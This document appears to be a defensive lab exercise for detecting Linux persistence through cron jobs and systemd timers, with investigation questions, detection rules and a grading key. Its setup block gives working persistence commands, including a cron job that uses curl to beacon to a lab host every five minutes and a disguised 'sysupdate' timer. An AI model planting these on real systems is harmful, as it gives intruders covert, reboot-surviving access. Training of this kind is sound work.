# S04 — Persistence: cron / systemd timer

**Tier 2 · ATT&CK: T1053.003 (Cron), T1053.006 (Systemd Timers)**

## Story
The attacker who got a foothold on `vic-lin` wants to survive a reboot. Something now runs on a schedule that wasn't there yesterday. Find the mechanism, the payload, and how often it beacons.

## Lab setup
- `vic-lin`, auditd with the `persistence` watches from `lab/SETUP.md`.
- Atomic Red Team installed (optional but ideal): `Invoke-AtomicTest T1053.003` / `T1053.006`.

## Run it
Randomize between cron and systemd, and randomize the schedule:
```bash
# A - cron
(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://10.10.10.5/b >/dev/null 2>&1') | crontab -
# or a root drop:
echo '*/10 * * * * root /usr/local/bin/update.sh' | sudo tee /etc/cron.d/update

# B - systemd timer
sudo tee /etc/systemd/system/sysupdate.service >/dev/null <<'S'
[Service]
ExecStart=/usr/local/bin/update.sh
S
sudo tee /etc/systemd/system/sysupdate.timer >/dev/null <<'T'
[Timer]
OnBootSec=2min
OnUnitActiveSec=5min
[Install]
WantedBy=timers.target
T
sudo systemctl enable --now sysupdate.timer
```

## Cleanup / revert
Revert to `baseline` (or `crontab -r`, `systemctl disable --now sysupdate.timer`, remove the unit files).

## What telemetry this generates
- **auditd** `persistence` watch: writes to `/etc/crontab`, `/etc/cron.d/`, `/etc/systemd/system/`.
- **Wazuh**: FIM/auditd alerts on the new cron file or unit. Each *firing* of the job shows up as a repeating `curl`/script exec in the auditd `exec` stream, so the beacon interval is visible in the log cadence.
- `journalctl -u sysupdate.timer` and `systemctl list-timers` show the schedule if you pivot on the host.

## Your investigation (fill cold)
cron or systemd? What's the payload and where does it call out? What's the beacon interval (read it from the log cadence, not the config)? When was persistence established relative to the initial foothold? Would a reboot clear it, or is it enabled at boot?

## Detection engineering
Auditd/FIM high-severity on any create/modify under `/etc/cron*`, `/etc/systemd/system/`, and per-user crontabs. A harder rule that flags a *new* process beaconing on a fixed interval is better still. Ship the file-create rule at minimum.

<details>
<summary>Grading key: don't open until your verdict is written</summary>

- Sealed truth: the mechanism (cron or timer), the schedule, the payload path, and the callback host.
- **Good:** you found the mechanism from the persistence watch, read the interval off the recurring exec entries, and stated boot-survival correctly. Bonus if you connected the persistence timestamp back to the S01/S03 foothold.
- **Miss:** finding the cron or timer file but never confirming it fired. An installed-but-never-run persistence and an active beacon look different in the logs, and that difference is the finding.
</details>
